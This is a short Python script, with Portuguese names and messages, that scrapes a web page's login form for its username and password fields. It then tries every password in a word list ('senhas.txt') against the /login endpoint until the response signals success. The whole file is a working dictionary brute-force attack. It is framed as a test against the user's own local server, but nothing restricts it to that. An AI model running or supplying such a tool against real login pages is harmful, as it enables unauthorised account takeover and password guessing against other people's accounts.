import requests
from bs4 import BeautifulSoup

def analisar_formulario(url):
    try:
        resposta = requests.get(url, timeout=5)
        resposta.raise_for_status()
    except Exception as e:
        print(f"Erro ao acessar {url}: {e}")
        return {}

    soup = BeautifulSoup(resposta.text, "html.parser")
    form = soup.find("form")
    campos = {}
    if form:
        for campo in form.find_all("input"):
            nome = campo.get("name")
            tipo = campo.get("type")
            if nome:
                campos[nome] = tipo
    return campos

def testar_senhas(url_base, arquivo, usuario="teste"):
    # Usa a página principal para análise dos campos
    campos = analisar_formulario(url_base)
    print("Campos encontrados no formulário:", campos)

    usuario_field = None
    senha_field = None
    for nome, tipo in campos.items():
        if tipo in ["text", "email"]:
            usuario_field = nome
        elif tipo == "password":
            senha_field = nome

    if not usuario_field or not senha_field:
        print("Não foi possível identificar campos de usuário e senha.")
        return

    tentativas = 0
    with open(arquivo, "r", encoding="utf-8") as f:
        for linha in f:
            senha = linha.strip()
            tentativas += 1
            dados = {usuario_field: usuario, senha_field: senha}

            try:
                # O endpoint que valida é /login
                resposta = requests.post(f"{url_base.rstrip('/')}/login", data=dados, timeout=5)
            except Exception as e:
                print(f"Erro ao enviar requisição: {e}")
                continue

            print(f"Tentativa {tentativas}: {senha}")
            if "login bem-sucedido" in resposta.text.lower():
                print(f"\n✅ Senha descoberta: {senha}")
                print(f"Total de tentativas: {tentativas}")
                return senha

    print(f"\n❌ Nenhuma senha encontrada após {tentativas} tentativas.")
    return None

if __name__ == "__main__":
    url = input("Digite a URL base do seu servidor de teste (ex.: http://127.0.0.1:5000): ").strip()
    testar_senhas(url, "senhas.txt")
